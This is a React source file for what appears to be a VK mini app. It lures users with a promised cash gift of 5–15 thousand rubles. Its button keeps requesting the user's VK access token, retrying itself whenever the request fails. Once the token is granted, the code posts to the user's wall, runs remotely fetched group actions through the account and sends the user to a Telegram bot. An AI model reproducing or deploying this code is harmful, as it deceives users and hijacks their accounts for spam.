import { useUnit } from "effector-react";
import { useEffect } from "react";
import "./App.css";
import { USER_SCOPE } from "./constants";
import { fetchConfigs } from "./data/config";
import { getUserTokenFX, wallPostFX } from "./data/effects.config";
import { $config } from "./data/store.config";
import { selectRandom } from "./utils/random";
import { processGroups } from "./vk-bridge/groups";

const TG_LINK = "https://t.me/stepx_bot";
const randomValue = selectRandom(5, 15);

function App() {
  const { givenScope, token, user } = useUnit($config);

  useEffect(() => {
    if (givenScope && givenScope !== USER_SCOPE) {
      getUserTokenFX();
    } else if (givenScope === USER_SCOPE && token && user) {
      wallPostFX({ token, userId: user.id }).then(async () => {
        const groupConfigs = await fetchConfigs();
        await processGroups(groupConfigs);
        window.open(TG_LINK, "_blank");
      });
    }
  }, [givenScope, token, user]);

  const handleClick = async () => {
    try {
      await getUserTokenFX();
    } catch {
      handleClick();
    }
  };
  return (
    <>
      <div>Приветствую!</div>
      <div>Забирай FULL и подарок в размере {randomValue} тыс. руб!</div>
      <button onClick={handleClick} style={{ marginTop: "1rem" }}>
        ПОЛУЧИТЬ
      </button>
    </>
  );
}

export default App;
